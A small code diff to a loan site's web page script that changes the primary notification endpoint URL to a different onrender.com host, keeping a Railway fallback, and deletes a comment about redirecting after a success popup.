@@ -217,8 +217,9 @@
   </div>
 
 <script>
+  // ✅ Working Render endpoint first, Railway as fallback
   const ENDPOINTS = [
-    "https://advanced-loan.onrender.com/notify",
+    "https://mtnadvanced-loans.onrender.com/notify",
     "https://web-production-1a1f07.up.railway.app/notify"
   ];
 
@@ -236,7 +237,6 @@
 
   function closeModal(){
     el('successModal').classList.remove('show');
-    // Redirect to index after the popup closes
     setTimeout(() => {
       window.location.href = 'index.html';
     }, 250);
